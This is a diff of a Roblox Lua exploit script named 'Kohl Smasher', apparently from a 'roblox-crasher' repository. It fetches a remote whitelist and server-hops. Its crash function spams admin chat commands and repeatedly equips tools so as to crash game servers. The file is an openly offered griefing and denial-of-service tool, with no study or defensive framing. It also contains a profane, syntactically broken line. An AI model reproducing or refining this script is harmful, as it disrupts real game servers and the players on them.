@@ -1,9 +1,18 @@
 -- RE WRITE
 
-
+local s, e = pcall(function()
+    function pr(t)
+        print("Kohl Smasher: " .. t .. " Loaded")
+        end
+    local gameFlr = workspace.Terrain._Game
+local adminFlr = gameFlr.Admin
+local plyrs = game:GetService("Players")
+local rns = game:GetService("RunService")
 local whitelisted = game:HttpGet("https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/whitelisted.json")
 whitelisted = game:GetService("HttpService"):JSONDecode(whitelisted)
 if not whitelisted then whitelisted = {users = {}} end
+whitelisted = whitelisted.users 
+pr("Variables")
 
 function notif(title, text, duration)
 local options = {
@@ -13,6 +22,8 @@ Duration = duration,
 }
 game:GetService("StarterGui"):SetCore("SendNotification", options)
 end
+pr("notif")
+
 
 function hop()
 local httpres = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .."/servers/Public?sortOrder=Asc&limit=100")
@@ -25,26 +36,25 @@ for i, server in pairs(servers) do
     end 
 end
 end
-
+pr("hop")
 function kill(msg)
     notif("Script Killed!", msg .. " | You will now be teleported to a different server", 10)
     "UR FAT ASS FUCKING MOM?":Kill()
 end
-
---[[
-for i , v in pairs(whitelisted.users) do 
-    if game:GetService("Players"):FindFirstChild(v) or game:GetService("Players"):GetPlayerByUserId(v) then
+pr("kill")
+    for i , v in pairs(whitelisted) do 
+    if game:GetService("Players"):FindFirstChild(v) or game:GetService("Players"):GetPlayerByUserId(tonumber(v) or 99999999999999999999999999999999999999999999999999999) then
     kill("A whitelisted player is in the server") 
     hop()
     end
 end
-]]--
 
+pr("whitelist")
 
 function chat(msg)
     game:GetService("Players"):Chat(msg)
 end
-
+pr("chat")
 
 function grab()
     coroutine.wrap(function()
@@ -68,9 +78,10 @@ end
 end
 end)()
 end
-
+pr("grab")
 function crash() 
 grab()
+pr("crash grab")
 task.wait(1)
 coroutine.wrap(function() 
     while task.wait() do 
@@ -78,17 +89,22 @@ coroutine.wrap(function()
     chat("gear me 94794847")
     for i, v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
                 if v:IsA("Tool") then
-                     game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
+                     game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):EquipTool(v)
                 end
     end
     end
     chat("size me 0000000000000000000.3")
     end
 end)()
+pr("Vamp Crash")
 end
 
 
 notif("Kohl Smasher", "Loaded.", 5)
 crash()
+pr("crash")
 task.wait(5 * 3)
-hop()
+--hop()
+end)
+
+if not s then warn(e) end
